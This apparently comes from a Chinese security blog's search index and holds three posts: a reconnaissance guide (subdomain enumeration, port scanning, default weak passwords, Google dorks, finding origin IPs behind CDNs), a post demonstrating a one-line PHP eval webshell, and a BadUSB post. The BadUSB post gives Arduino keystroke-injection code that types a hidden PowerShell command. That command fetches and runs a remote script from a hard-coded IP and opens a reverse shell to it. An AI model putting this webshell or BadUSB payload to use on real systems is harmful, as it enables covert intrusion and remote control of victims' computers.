<h4 id="kali自带"><a href="#kali自带" class="headerlink" title="kali自带"></a>kali自带</h4><pre><code>命令:whois www.xxx.com</code></pre><h3 id="2-备案查询"><a href="#2-备案查询" class="headerlink" title="2.备案查询"></a>2.备案查询</h3><h4 id="注册人姓名"><a href="#注册人姓名" class="headerlink" title="注册人姓名"></a>注册人姓名</h4><p>​    <a href="http://beianbeian.com" target="_blank" rel="noopener">http://beianbeian.com</a> //IPC备案查询<br>​    <a href="http://tianyancha.com" target="_blank" rel="noopener">http://tianyancha.com</a> //天眼查<br>​    <a href="http://beian.miit.gov.cn" target="_blank" rel="noopener">http://beian.miit.gov.cn</a> //工信部</p>
<h3 id="3-子域名收集"><a href="#3-子域名收集" class="headerlink" title="3.子域名收集"></a>3.子域名收集</h3><h4 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h4><ul>
<li><a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">Subbrute</a> //快速枚举 DNS 记录和子域名。</li>
<li><a href="https://nmap.org/nsedoc/scripts/dns-brute.html" target="_blank" rel="noopener">Nmap</a> - 不仅仅只是端口扫描，可以使用脚本枚举子域名。使用 <code>--script dns-brute</code> 脚本。</li>
<li>谷歌语法:site:github.com</li>
<li><a href="https://github.com/ring04h/wydomain" target="_blank" rel="noopener">wydomain2</a> - 猪猪侠的作品，好用不解释。</li>
<li><a href="http://www.cnseay.com/4452/" target="_blank" rel="noopener">Layer 子域名挖掘机</a> //法师的作品，因为是用.NET写的，所以基本只能在Win下使用，也是相当好用的。</li>
</ul>
<h4 id="网站："><a href="#网站：" class="headerlink" title="网站："></a>网站：</h4><ul>
<li><a href="http://tool.chinaz.com/subdomain" target="_blank" rel="noopener">http://tool.chinaz.com/subdomain</a>   //站长工具</li>
<li><a href="https://censys.io" target="_blank" rel="noopener">https://censys.io</a>   //证书查找</li>
<li><a href="https://phpinfo.me/domain" target="_blank" rel="noopener">https://phpinfo.me/domain</a>   //在线子域名爆破工具</li>
<li><a href="https://virustotal.com/" target="_blank" rel="noopener">https://virustotal.com/</a> //cdn缓存查询 也提供恶意程序分析</li>
<li><a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io</a> //无需多言，不仅可以看到子域名信息，还会显示对应的服务器版本及其他更多数据。</li>
</ul>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>子域名发现的原理无非就是以下几种：</p>
<ol>
<li>利用现有搜索引擎： <ul>
<li>网页搜索引擎（如：谷歌等）</li>
<li>空间搜索引擎（如：Shodan等）</li>
<li>SSL证书（如：crt.sh等），这个主要针对大站</li>
</ul>
</li>
<li>进行爆破，而爆破又分为两种： <ul>
<li>直接访问子域名</li>
<li>利用 DNS 请求</li>
</ul>
</li>
<li>其他泄露信息： <ul>
<li>如 crossdomain.xml 文件等</li>
<li>爬虫递归爬取等</li>
<li>DNS域传送漏洞等</li>
</ul>
</li>
</ol>
<h3 id="4-CMS识别"><a href="#4-CMS识别" class="headerlink" title="4.CMS识别"></a>4.CMS识别</h3><p>尽量搞明白web程序是用了什么CMS或者是用什么框架开发的<br>比如Thinkphp、Strust2。都有成熟的POC</p>
<h4 id="在线识别"><a href="#在线识别" class="headerlink" title="在线识别:"></a>在线识别:</h4><p><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a> //识别很快python写的网站<br><a href="http://www.yunsee.cn" target="_blank" rel="noopener">www.yunsee.cn</a> //云悉</p>
<h4 id="本地识别"><a href="#本地识别" class="headerlink" title="本地识别"></a>本地识别</h4><p>御剑cms 大禹cms</p>
<h4 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h4><p>whatweb url</p>
<h3 id="5-敏感目录扫描"><a href="#5-敏感目录扫描" class="headerlink" title="5.敏感目录扫描"></a>5.敏感目录扫描</h3><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>​    御剑、Dirmap、wwwscan、DirBuster、Dirsearch、cansina。</p>
<h4 id="kali-1"><a href="#kali-1" class="headerlink" title="kali"></a>kali</h4><p>​    dirb url //命令行使用<br>​    dirbuster     //界面化工具<br>​    wordpress:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan -u http://www.baidu.comcom  //kali扫描WordPress漏洞</span><br></pre></td></tr></table></figure>

<h3 id="6-端口"><a href="#6-端口" class="headerlink" title="6.端口"></a>6.端口</h3><h4 id="端口信息收集："><a href="#端口信息收集：" class="headerlink" title="端口信息收集："></a>端口信息收集：</h4><h5 id="Windows："><a href="#Windows：" class="headerlink" title="Windows："></a>Windows：</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -anbo       //windows查看开放端口及对应进程，-a查看所有连接和侦听端口，-n以数字方式显示地址和端口号，-b显示端口连接的程序，-o显示关联pid</span><br></pre></td></tr></table></figure>
<h5 id="Linux："><a href="#Linux：" class="headerlink" title="Linux："></a>Linux：</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -tunlp       // -t (tcp) 仅显示tcp相关选项 -u (udp)仅显示udp相关选项 -n 拒绝显示别名，能显示数字的全部转化为数字 -l 仅列出在Listen(监听)的服务状态 -a (all)列出所有服务状态-p 显示建立相关链接的程序名</span><br></pre></td></tr></table></figure>
<h4 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h4><h5 id="本地工具"><a href="#本地工具" class="headerlink" title="本地工具"></a>本地工具</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -A -v -T4 &lt;目标IP&gt; //查看开放端口</span><br><span class="line">nmap &lt;目标IP&gt; -p &lt;探测端口&gt;</span><br><span class="line">masscan -p&lt;探测端口&gt; &lt;目标IP&gt; --rate=10000  //rate每秒发送的数据包</span><br></pre></td></tr></table></figure>
<h5 id="在线工具："><a href="#在线工具：" class="headerlink" title="在线工具："></a>在线工具：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://tool.chinaz.com/port    //站长工具</span><br></pre></td></tr></table></figure>
<h4 id="常见端口漏洞"><a href="#常见端口漏洞" class="headerlink" title="常见端口漏洞"></a>常见端口漏洞</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">21    FTP      匿名访问，弱口令</span><br><span class="line">22    SSH      弱口令登录</span><br><span class="line">23    Telnet   弱口令登录</span><br><span class="line">80    Web      常见Web漏洞或后台登录弱口令</span><br><span class="line">161   SNMP     public弱口令</span><br><span class="line">389   LDAP     匿名访问</span><br><span class="line">443   openssl  心脏滴血等</span><br><span class="line">445   smb      操作系统溢出漏洞</span><br><span class="line">873   rsync    匿名访问，弱口令</span><br><span class="line">1099  JAVArmi  命令执行</span><br><span class="line">1433  MsSQL    弱口令</span><br><span class="line">1521  Oracle   弱口令</span><br><span class="line">2601  Zebra    默认密码zebra</span><br><span class="line">3128  squid    匿名访问（可能内网漫游）</span><br><span class="line">3306  MySQL    弱口令</span><br><span class="line">3389  RDP      远程桌面弱口令</span><br><span class="line">4440  Rundeck          弱口令admin</span><br><span class="line">4848  GlassFish        弱口令admin/adminadmin</span><br><span class="line">5432  PostGreSQL       弱口令爆破</span><br><span class="line">6379  Redis            匿名访问</span><br><span class="line">7001,7002   Weblogic         弱口令爆破</span><br><span class="line">8080        Tomcat\Jboss     弱口令，Jboss匿名访问</span><br><span class="line">8080-8090   常见Web端口</span><br><span class="line">9043        WebSphere        弱口令爆破</span><br><span class="line">27017       MongoDB          未授权访问</span><br></pre></td></tr></table></figure>

<h3 id="7-敏感信息收集"><a href="#7-敏感信息收集" class="headerlink" title="7.敏感信息收集"></a>7.敏感信息收集</h3><h4 id="Google-Hack"><a href="#Google-Hack" class="headerlink" title="Google Hack"></a>Google Hack</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filetype: 搜索制定类型的文件，例如：filetype:doc.将返回所有以doc结尾的文件URL。</span><br><span class="line">intext: 把网页中的正文内容中的某个字符做为搜索条件。例如在google里输入:intext:Melon.将返回所有在网页正文部分包含”Melon”的网页。</span><br><span class="line">intitle: 搜索网页标题中是否有我们所要找的字符。allintitle:也同intitle类似。</span><br><span class="line">cache: 搜索google里关于某些内容的缓存,有时候往往能找到一些好东西。</span><br><span class="line">info: 查找指定站点的一些基本信息。</span><br><span class="line">inurl: 搜索我们指定的字符是否存在于URL中.例如输入:inurl:admin,将返回N个类似于这样的连接:http://xxx/admin,常用于查找通用漏洞、注入点、管理员登录的URL。</span><br><span class="line">allinurl:也同inurl类似,可指定多个字符</span><br><span class="line">linkurl: 例如搜索:linkurl:melons.top可以返回所有和melons.top做了链接的URL。</span><br><span class="line">site: 搜索指定域名,如site:melons.top.将返回所有和melons.top有关的URL。</span><br></pre></td></tr></table></figure>
<h4 id="查看响应头"><a href="#查看响应头" class="headerlink" title="查看响应头"></a>查看响应头</h4><p>F12查看系统，中间件版本。</p>
<h4 id="通过Github搜索获取敏感信息"><a href="#通过Github搜索获取敏感信息" class="headerlink" title="通过Github搜索获取敏感信息"></a>通过Github搜索获取敏感信息</h4><p>site:Github password</p>
<h3 id="8-真实IP"><a href="#8-真实IP" class="headerlink" title="8.真实IP"></a>8.真实IP</h3><p><strong>IP查询</strong><br><a href="https://www.ipip.net" target="_blank" rel="noopener">https://www.ipip.net</a>       查询该ip的具体信息<br><a href="https://site.ip138.com" target="_blank" rel="noopener">https://site.ip138.com</a>    ip反查域名/域名对应ip<br><a href="http://www.cip.cc/" target="_blank" rel="noopener">http://www.cip.cc/</a>          本机ip/其他ip简单信息</p>
<p><strong>判断是否为CDN</strong></p>
<h4 id="1、多地ping"><a href="#1、多地ping" class="headerlink" title="1、多地ping"></a>1、多地ping</h4><p>如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~<br><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/DnsPing.png" alt="html">    </p>
<h4 id="2、nslookup"><a href="#2、nslookup" class="headerlink" title="2、nslookup"></a>2、nslookup</h4><p>使用nslookup查看域名解析对应的IP地址，如果解析到多个IP地址则说明使用了CDN~<br><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/nslookup.png" alt="html"><br>从上面可以看到解析到多个IP地址说明使用了CDN~</p>
<h4 id="3、使用CDN查询工具进行查看"><a href="#3、使用CDN查询工具进行查看" class="headerlink" title="3、使用CDN查询工具进行查看"></a>3、使用CDN查询工具进行查看</h4><p><a href="https://www.ipip.net/ip.html" target="_blank" rel="noopener">https://www.ipip.net/ip.html</a> //高精度IP查询<br><strong>绕CDN查真实IP地址</strong></p>
<h4 id="1、域名历史解析记录"><a href="#1、域名历史解析记录" class="headerlink" title="1、域名历史解析记录"></a>1、域名历史解析记录</h4><p>查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://dnsdb.io/zh-cn/</span><br><span class="line">https://x.threatbook.cn/</span><br><span class="line">http://toolbar.netcraft.com/site_report?url=</span><br><span class="line">http://viewdns.info/</span><br></pre></td></tr></table></figure>

<h4 id="2、查询子域名"><a href="#2、查询子域名" class="headerlink" title="2、查询子域名"></a>2、查询子域名</h4><p>很多站长也许只会对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过子域名查询对应的 IP 来辅助查找网站的真实IP。</p>
<h4 id="3、漏洞利用"><a href="#3、漏洞利用" class="headerlink" title="3、漏洞利用"></a>3、漏洞利用</h4><p>目标敏感文件泄露，例如：phpinfo之类的探针、GitHub信息泄露等。<br><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/phpinfo.png" alt="html"><br>XSS盲打，命令执行反弹shell，SSRF等。<br>无论是用社工还是其他手段，拿到了目标网站管理员在CDN的账号，从而在从CDN的配置中找到网站的真实IP。</p>
<h4 id="4、网站邮件订阅查找"><a href="#4、网站邮件订阅查找" class="headerlink" title="4、网站邮件订阅查找"></a>4、网站邮件订阅查找</h4><p>让服务器主动连接我们告诉我们它的IP，不过使用的是合法的服务，如RSS邮件订阅，很多网站都自带sendmail，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实 IP 了。</p>
<h4 id="5、使用国外主机解析域名"><a href="#5、使用国外主机解析域名" class="headerlink" title="5、使用国外主机解析域名"></a>5、使用国外主机解析域名</h4><p>国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实IP。</p>
<h4 id="6、网络空间引擎搜索法"><a href="#6、网络空间引擎搜索法" class="headerlink" title="6、网络空间引擎搜索法"></a>6、网络空间引擎搜索法</h4><p>常见的有以前的钟馗之眼，shodan，fofa搜索。以fofa为例，只需输入：title:“网站的title关键字”或者body：“网站的body特征”就可以找出fofa收录的有这些关键字的ip域名，很多时候能获取网站的真实ip。</p>
<h4 id="7、F5-LTM解码法"><a href="#7、F5-LTM解码法" class="headerlink" title="7、F5 LTM解码法"></a>7、F5 LTM解码法</h4><p>当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip。</p>
<h4 id="8、利用网站返回的内容寻找真实原始IP"><a href="#8、利用网站返回的内容寻找真实原始IP" class="headerlink" title="8、利用网站返回的内容寻找真实原始IP"></a>8、利用网站返回的内容寻找真实原始IP</h4><p>如果原始服务器IP也返回了网站的内容，那么可以在网上搜索大量的相关数据。<br>浏览网站源代码，寻找独特的代码片段。在JavaScript中使用具有访问或标识符参数的第三方服务（例如Google Analytics，reCAPTCHA）是攻击者经常使用的方法。</p>
<h4 id="9、利用SSL证书寻找真实原始IP"><a href="#9、利用SSL证书寻找真实原始IP" class="headerlink" title="9、利用SSL证书寻找真实原始IP"></a>9、利用SSL证书寻找真实原始IP</h4><p>以CloudFlare这款CDN加速器举例：假如你在 abc.com 上托管了一个服务，原始服务器IP是136.23.63.44。 而CloudFlare则会为你提供DDoS保护，Web应用程序防火墙和其他一些安全服务，以保护你的服务免受攻击。<br>为此，你的Web服务器就必须支持SSL并具有证书，此时CloudFlare与你的服务器之间的通信，就像你和CloudFlare之间的通信一样，会被加密（即没有灵活的SSL存在）。这看起来很安全，但问题是，当你在端口443(<a href="https://x.x.x.x:443" target="_blank" rel="noopener">https://x.x.x.x:443</a>) 上直接连接到IP时，SSL证书就会被暴露。<br>此时，如果攻击者扫描0.0.0.0/0，即整个互联网，他们就可以在端口443上获取在 aaa.com上的有效证书，进而获取提供给你的Web服务器IP。<br>目前Censys工具(<a href="https://censys.io/" target="_blank" rel="noopener">https://censys.io/</a>) 就能实现对整个互联网的扫描，Censys是一款用以搜索联网设备信息的新型搜索引擎，安全专家可以使用它来评估他们实现方案的安全性，而黑客则可以使用它作为前期侦查攻击目标、收集目标信息的强大利器。<br>Censys搜索引擎能够扫描整个互联网，Censys每天都会扫描IPv4地址空间，以搜索所有联网设备并收集相关的信息，并返回一份有关资源（如设备、网站和证书）配置和部署信息的总体报告。<br>而攻击者唯一需要做的就是把上面用文字描述的搜索词翻译成实际的搜索查询参数。<br>Censys证书查询搜索步骤如下：</p>
<h5 id="1、aaa-com-证书的搜索查询参数为：parsed-names：aaa-com"><a href="#1、aaa-com-证书的搜索查询参数为：parsed-names：aaa-com" class="headerlink" title="1、aaa.com 证书的搜索查询参数为：parsed.names：aaa.com"></a>1、aaa.com 证书的搜索查询参数为：parsed.names：aaa.com</h5><p>只显示有效证书的查询参数为：tags.raw：trusted<br>攻击者可以在Censys上实现多个参数的组合，这可以通过使用简单的布尔逻辑来完成。</p>
<h5 id="2、组合后的搜索参数为：parsed-names-aaa-com-and-tags-raw-trusted"><a href="#2、组合后的搜索参数为：parsed-names-aaa-com-and-tags-raw-trusted" class="headerlink" title="2、组合后的搜索参数为：parsed.names: aaa.com and tags.raw: trusted"></a>2、组合后的搜索参数为：parsed.names: aaa.com and tags.raw: trusted</h5><h5 id="3、Censys将向你显示符合上述搜索条件的所有标准证书。要逐个查看这些搜索结果，攻击者可以通过单击右侧的”Explore”，打开包含多个工具的下拉菜单。What’s-using-this-certificate-gt-IPv4-Hosts；"><a href="#3、Censys将向你显示符合上述搜索条件的所有标准证书。要逐个查看这些搜索结果，攻击者可以通过单击右侧的”Explore”，打开包含多个工具的下拉菜单。What’s-using-this-certificate-gt-IPv4-Hosts；" class="headerlink" title="3、Censys将向你显示符合上述搜索条件的所有标准证书。要逐个查看这些搜索结果，攻击者可以通过单击右侧的”Explore”，打开包含多个工具的下拉菜单。What’s using this certificate? &gt; IPv4 Hosts；"></a>3、Censys将向你显示符合上述搜索条件的所有标准证书。要逐个查看这些搜索结果，攻击者可以通过单击右侧的”Explore”，打开包含多个工具的下拉菜单。What’s using this certificate? &gt; IPv4 Hosts；</h5><h4 id="10、通过shodan-favicon-ico获取真实IP"><a href="#10、通过shodan-favicon-ico获取真实IP" class="headerlink" title="10、通过shodan favicon.ico获取真实IP"></a>10、通过shodan favicon.ico获取真实IP</h4><p>在Shodan搜索中有一个关于网站icon图标的搜索语法，<strong>http.favicon.hash</strong>，我们可以使用这个语法来搜索出使用了同一icon图标的网站。(其实这种方法是看运气的，如果shodan中收录了目标网站则可以查到)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> mmh3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">response = requests.get(<span class="string">'https://www.baidu.com/favicon.ico'</span>)</span><br><span class="line">favicon = response.content.encode(<span class="string">'base64'</span>)</span><br><span class="line">hash = mmh3.hash(favicon)</span><br><span class="line"><span class="keyword">print</span> hash</span><br></pre></td></tr></table></figure>
<p>计算出的hash用 http.favicon.hash：hash 搜索</p>
<h3 id="9-shodan"><a href="#9-shodan" class="headerlink" title="9.shodan"></a>9.shodan</h3><p>shodan网站：<a href="http://www.shodan.io" target="_blank" rel="noopener">www.shodan.io</a><br>webcam //网络摄像头<br>搜索技巧：<br>   搜索指定端口：port:3389<br>   搜索指定IP地址：host:61.135.169.121<br>   搜索具体城市开放具体端口：city:hangzhou port:22<br>   搜索指定服务器：microsoft iis 6.0 / apache<br>kali：<br>   获取自身外部ip：myip<br>   查询指定IP：host xxxx (网页版可能不会显示)<br>   查看蜜罐保护：shodan honeyscore xxxx<br>python-shodan：<br>   初始化api key<br>   python-shodan search 方法：</p>
<ul>
<li>result = api.search(‘apache’)</li>
<li>print(result[‘total’])</li>
<li>查看api键值：<a href="https://developer.shodan.io/api" target="_blank" rel="noopener">https://developer.shodan.io/api</a></li>
<li>python-shodan查找ip：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">常用 Shodan 库函数</span><br><span class="line">shodan.Shodan(key) ：初始化连接API</span><br><span class="line">Shodan.count(query, facets=None)：返回查询结果数量</span><br><span class="line">Shodan.host(ip, history=False)：返回一个IP的详细信息</span><br><span class="line">Shodan.ports()：返回Shodan可查询的端口号</span><br><span class="line">Shodan.protocols()：返回Shodan可查询的协议</span><br><span class="line">Shodan.services()：返回Shodan可查询的服务</span><br><span class="line">Shodan.queries(page=1, sort=&apos;timestamp&apos;, order=&apos;desc&apos;)：查询其他用户分享的查询规则</span><br><span class="line">Shodan.scan(ips, force=False)：使用Shodan进行扫描，ips可以为字符或字典类型</span><br><span class="line">Shodan.search(query, page=1, limit=None, offset=None, facets=None, minify=True)：查询Shodan数据</span><br></pre></td></tr></table></figure>

<h3 id="10-旁站"><a href="#10-旁站" class="headerlink" title="10.旁站"></a>10.旁站</h3><p>看看网站有没有旁站<br><a href="https://phpinfo.me/bing.php" target="_blank" rel="noopener">https://phpinfo.me/bing.php</a> //查询IP 查询旁站<br>对旁站进行信息收集 为下面的以后的漏洞挖掘做准备。</p>
<h3 id="11-判断系统版本"><a href="#11-判断系统版本" class="headerlink" title="11.判断系统版本"></a>11.判断系统版本</h3><p>最快速的就是利用Windows和Linux的对大小写敏感来判断<br>Windows对大小写不敏感 Linux对大小写敏感<br>利用TTL起始值判断操作系统,不同类型的操作系统都有默认的TTL值<br>TTL起始值:Windows xp(及在此版本之前的windows) 128 (广域网中TTL为65-128)<br><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Windows.png" alt="html"><br>Linux/Unix64(广域网中TTL为1-64)<br><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Linux.png" alt="html"><br>某些Unix:255，网关:255<br><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Gateway.png" alt="html"><br>使用nmap识别操作系统:nmap -O 192.168.0.1 #参数-O表示扫描操作系统信息,nmap基于签名,指纹,特征,CPE编号等方法去判断目标系统的信息 。<br><img src="/images/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/nmapO.png" alt="html"></p>
<h3 id="11-目标用的是哪种web服务器-具体版本号是多少"><a href="#11-目标用的是哪种web服务器-具体版本号是多少" class="headerlink" title="11.目标用的是哪种web服务器 具体版本号是多少"></a>11.目标用的是哪种web服务器 具体版本号是多少</h3><p>首先手工测试目标web服务器是否允许一些危险请求的方法：put move options<br>Apach 2.2.x/2.4.x<br>Nginx<br>IIS 6.x/7.x/8.x 尝试webdav写及远程执行<a href="https://github.com/edwardz246003/IIS_exploit" target="_blank" rel="noopener">CVE-2017-7269</a> 尝试短文件漏洞目录文件扫描<br>Tomcat 6.x/7.x/8.x 曾经出现的远程命令执行多 默认的管理面板 弱口令 部署war包<br>Jboss 未授权访问进入JBoss后台进行文件上传的漏洞，例如：CVE-2007-1036，CVE-2010-0738,CVE-2005-5750 Java反序列化进行远程代码执行的漏洞，例如：CVE-2015-7501，CVE-2017-7504，CVE-2017-12149，CVE-2013-4810。 还有一种 JBoss seam2的模板注入CVE-2010-1871漏洞。<br>Resin<br> 是否是集成环境 XAMPP LNMP</p>
<h3 id="12-目标站有没有WAF"><a href="#12-目标站有没有WAF" class="headerlink" title="12.目标站有没有WAF"></a>12.目标站有没有WAF</h3><p> 有没有WAF，是什么类型的WAF 加入敏感特征看看会不会拦截 FUZZ测试</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
        <tag>端口</tag>
      </tags>
  </entry>
  <entry>
    <title>JsWebshell</title>
    <url>/2019/12/11/JSshell/</url>
    <content><![CDATA[<p>在目标站有可写的html点时可以使用</p>
<a id="more"></a>

<h3 id="0x00-准备环境"><a href="#0x00-准备环境" class="headerlink" title="0x00 准备环境"></a>0x00 准备环境</h3><p>环境使用的是：PHP Version 5.6.27+Apach</p>
<h3 id="0x01-开始实验"><a href="#0x01-开始实验" class="headerlink" title="0x01 开始实验"></a>0x01 开始实验</h3><p>准备的代码为（这里用的虽然是js其实最后还是用了php）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language=php&gt;@eval($_POST[&apos;web&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>在这里我们先用纯Html做一次测试</p>
<p><img src="/images/JSshell/html.png" alt="html"></p>
<p>我们访问html页面发现并没有任何反应</p>
<p><img src="/images/JSshell/htmlphpinfo.png" alt="html"></p>
<p>我们再次访问php页面查看结果发现phpinfo出现在了页面上</p>
<p><img src="/images/JSshell/phpphpinfo.png" alt="html"></p>
<p>这里再测试一下可以利用的版本发现7以上的版本都不能顺利执行</p>
<p><img src="/images/JSshell/7.0.png" alt="html"></p>
<h3 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h3><p>利用条件已经很明确了，必须要php下确实存在的才可以被利用，这个方法可用完全是因为php支持html的原因，php7移除该方法，其实利用条件还是比较苛刻的。</p>
]]></content>
      <categories>
        <category>webshell</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>BadUsb</title>
    <url>/2019/04/19/BadUsb/</url>
    <content><![CDATA[<p>在2014年美国黑帽大会上，柏林SRLabs的安全研究人员JakobLell和独立安全研究人员Karsten Nohl展示了他们称为“BadUSB”(按照BadBIOS命名)的攻击方法，这种攻击方法让USB安全和几乎所有和USB相关的设备(包括具有USB端口的电脑)都陷入相当危险的状态。</p>
<a id="more"></a>

<h5 id="Windows系统自启动路径"><a href="#Windows系统自启动路径" class="headerlink" title="Windows系统自启动路径"></a>Windows系统自启动路径</h5><pre><code>%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup</code></pre><h4 id="附自己的一些代码"><a href="#附自己的一些代码" class="headerlink" title="附自己的一些代码"></a>附自己的一些代码</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include&lt;Keyboard.h&gt; //包含键盘模块头文件</span></span><br><span class="line">void setup()&#123; //初始化</span><br><span class="line">Keyboard.begin();//开始键盘通信</span><br><span class="line">delay(<span class="number">1000</span>);//延时<span class="number">1000</span>毫秒，</span><br><span class="line">Keyboard.press(KEY_LEFT_GUI);//按下徽标键 也就是win键 </span><br><span class="line">Keyboard.press(<span class="string">'r'</span>);//按下r键 CMD</span><br><span class="line">delay(<span class="number">500</span>); </span><br><span class="line">Keyboard.release(KEY_LEFT_GUI);//松掉win键 </span><br><span class="line">Keyboard.release(<span class="string">'r'</span>);//松掉r键 </span><br><span class="line">Keyboard.println(<span class="string">"cmd"</span>);</span><br><span class="line">delay(<span class="number">500</span>); </span><br><span class="line">//Keyboard.println(<span class="string">"cmd.exe /T:01 /K mode CON: COLS=16 LINES=1"</span>); //缩小窗口</span><br><span class="line">//Keyboard.println(<span class="string">"<span class="variable">$clnt</span> = new-object System.Net.WebClient;<span class="variable">$url</span>= 'http://47.93.12.104/water.ps1';<span class="variable">$file</span> = 'D:\\melon.ps1';<span class="variable">$clnt</span>.DownloadFile(<span class="variable">$url</span>,<span class="variable">$file</span>);D:\\melon.ps1;"</span>);</span><br><span class="line">//.println(<span class="string">"powershell -w hidden while(1)&#123;IEX (New-Object Net.WebClient).DownloadString('D:\\melon.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 47.93.12.104 -port 9999&#125;"</span>);</span><br><span class="line">Keyboard.println(<span class="string">"powershell -w hidden while(1)&#123;IEX (New-Object Net.WebClient).DownloadString('http://47.93.12.104/water.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 47.93.12.104 -port 9999&#125;"</span>);</span><br><span class="line">Keyboard.press(KEY_RETURN);  //按下回车键</span><br><span class="line">Keyboard.release(KEY_RETURN); //释放回车键</span><br><span class="line">Keyboard.end();//结束键盘通讯 </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">void loop()//循环，这里的代码</span><br><span class="line">&#123; </span><br><span class="line">//循环体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>硬件安全</category>
      </categories>
      <tags>
        <tag>钓鱼</tag>
        <tag>USB</tag>
      </tags>
  </entry>
</search>
